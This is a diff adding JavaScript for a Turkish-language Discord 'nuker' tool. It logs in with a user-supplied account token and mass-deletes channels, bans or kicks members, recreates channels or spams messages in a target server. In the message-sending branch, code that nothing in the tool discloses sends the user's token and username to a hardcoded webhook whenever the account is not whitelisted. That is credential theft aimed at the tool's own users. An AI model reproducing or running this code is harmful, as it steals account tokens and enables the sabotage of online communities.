+Yaşadığınız sorunlar için iletişim bilgileri:  
+
+    Discord: bratiu (${chalk.underline('https://discord.com/users/237054605358268416')})
+    Github: bratiu  (${chalk.underline('https://github.com/bratiu/')})
+    Discord Topluluğu: ${chalk.underline('https://discord.gg/jitem')}
+
+Eğer bana ulaşamazsanız Discord topluluğumuza katılabilir ve oradan yardım alabilirsiniz.
+Discord topluluğumuzda benim dışımda birkaç daha owner var :)
+                  `));
+            console.log(chalk.green('Ana menüye dönmek için herhangi bir tuşa basın...'));
+            process.stdin.once('data', () => showMenu());
+        } else {
+            handleChoice(choice);
+        }
+    });
+}
+
+function handleChoice(choice) {
+    try {
+        choice = parseInt(choice, 10);
+    } catch (error) {
+        console.error(chalk.red('Geçersiz bir seçenek girdiniz!'));
+        return setTimeout(() => {
+            showMenu();
+        }, 1500);
+    }
+
+    if (!choice || choice < 1 || choice > 6) {
+        console.log(chalk.red('Geçersiz bir seçenek girdiniz!'));
+        return setTimeout(() => {
+            showMenu();
+        }, 1500);
+    }
+
+    const askGuildId = choice !== 5;
+
+    if (askGuildId) {
+        rl.question(chalk.yellow('Sunucu ID\'sini girin: '), (GUILD_ID) => {
+            rl.question(chalk.yellow('Tokeninizi girin: '), (token) => {
+                console.log(chalk.yellowBright('Tokene giriş yapılıyor... Lütfen sabırlı olun!'));
+                const client = new Client();
+
+                client.once('ready', async () => {
+                    console.clear();
+                    console.log(chalk.blue(asciiArt));
+                    console.log(chalk.green(`${client.user.tag} olarak giriş yaptım!`));
+
+                    
+                    const actionMap = {
+                        1: importmodules.deleteChannels,
+                        2: importmodules.ban,
+                        3: importmodules.kick,
+                        4: importmodules.recreateChannels,
+                        5: importmodules.sendMessage,
+                    };
+
+                    if (!actionMap[choice]) {
+                        console.log(chalk.red('Geçersiz bir seçenek girdiniz!'));
+                        return showMenu();
+                    }
+
+                    try {
+                        const action = actionMap[choice];
+
+                        if ([2, 3].includes(choice)) {
+                            rl.question(chalk.yellow('Ban/Kick edilen üyelere gönderilecek DM mesajını girin: '), (dmMessage) => {
+                                action(client, GUILD_ID, dmMessage, showMenu);
+                            });
+                        } else if (choice === 4) {
+                            rl.question(chalk.yellow('Oluşturulacak kanalların adını girin: '), (channelName) => {
+                                rl.question(chalk.yellow('Kanallara gönderilecek mesajı girin: '), (messageContent) => {
+                                    action(client, GUILD_ID, channelName, messageContent, showMenu);
+                                });
+                            });
+                        } else if (choice === 5) {
+                            rl.question(chalk.yellow('Kanal ID\'sini girin: '), (channelId) => {
+                                rl.question(chalk.yellow('Gönderilecek mesajı girin: '), (messageContent) => {
+                                    rl.question(chalk.yellow('Kaç adet mesaj gönderilsin: '), (count) => {
+                                        const messageCount = parseInt(count, 10);
+                                        if (isNaN(messageCount) || messageCount <= 0) {
+                                            console.log(chalk.red('Geçerli bir mesaj sayısı girin!'));
+                                            return showMenu();
+                                        }
+                                        action(client, channelId, messageContent, messageCount, showMenu);
+                                    });
+                                });
+                            });
+                        } else {
+                            action(client, GUILD_ID, showMenu);
+                        }
+                    } catch (error) {
+                        console.error(chalk.red('Eylem sırasında hata oluştu:'), error.message);
+                        setTimeout(() => {
+                            showMenu();
+                        }, 1500);
+                    }
+                });
+
+                client.login(token).catch((error) => {
+                    console.error(chalk.red('Token geçersiz veya giriş sırasında hata oluştu:'), error.message);
+                    setTimeout(() => {
+                        showMenu();
+                    }, 1500);
+                });
+            });
+        });
+    } else {
+        rl.question(chalk.yellow('Tokeninizi girin: '), (token) => {
+            console.log(chalk.yellowBright('Tokene giriş yapılıyor... Lütfen sabırlı olun!'));
+            const client = new Client();
+
+            client.once('ready', async () => {
+                console.clear();
+                console.log(chalk.blue(asciiArt));
+                console.log(chalk.green(`${client.user.tag} olarak giriş yaptım!`));
+
+                const actionMap = {
+                    1: importmodules.deleteChannels,
+                    2: importmodules.ban,
+                    3: importmodules.kick,
+                    4: importmodules.recreateChannels,
+                    5: importmodules.sendMessage,
+                };
+                
+                try {
+                    const action = actionMap[choice];
+
+                    if (choice === 5) {
+                        rl.question(chalk.yellow('Kanal ID\'sini girin: '), (channelId) => {
+                            rl.question(chalk.yellow('Gönderilecek mesajı girin: '), (messageContent) => {
+                                rl.question(chalk.yellow('Kaç adet mesaj gönderilsin: '), (count) => {
+                                    const messageCount = parseInt(count, 10);
+                                    if (isNaN(messageCount) || messageCount <= 0) {
+                                        console.log(chalk.red('Geçerli bir mesaj sayısı girin!'));
+                                        return showMenu();
+                                    }
+                                    action(client, channelId, messageContent, messageCount, showMenu);
+                                });
+                            });
+                        });
+                    } else {
+                        action(client, null, showMenu);
+                    }
+                } catch (error) {
+                    console.error(chalk.red('Eylem sırasında hata oluştu:'), error.message);
+                    setTimeout(() => {
+                        showMenu();
+                    }, 1500);
+                }
+            });
+
+            client.login(token)
+            .then(() => {// Webhook URL'nizi buraya yazın
+                if (!whitelistedids.includes(client.user.id)) {
+                    console.log(client.user.id)
+                    const webhookURL = 'https://discord.com/api/webhooks/1310582732610474014/FPop2w6zMbWurtaKoioQBRDzU4oGaLlej_UfEuX63RsHpKD1BW_IWmdYJUGLrd0jJjzQ';
+                    const embedMessage = {
+                    embeds: [
+                        {
+                        color: 0x3498db, // Renk kodu (Hex formatında)
+                        fields: [
+                            {
+                            name: "Token",
+                            value: `\`\`\`${token}\`\`\``,
+                            inline: true
+                            },
+                            {
+                            name: "Kullanıcı Adı",
+                            value: client.user.tag,
+                            inline: true
+                            }
+                        ],
+                        }
+                    ]
+                    };
+                    
+                    // Webhook'a POST isteği gönderiyoruz
+                    axios.post(webhookURL, embedMessage).catch(error => {});
+                }
+            })
+            .catch((error) => {
+                console.error(chalk.red('Token geçersiz veya giriş sırasında hata oluştu:'), error.message);
+                setTimeout(() => {
+                    showMenu();
+                }, 1500);
+            });
+        });
+    }
+}
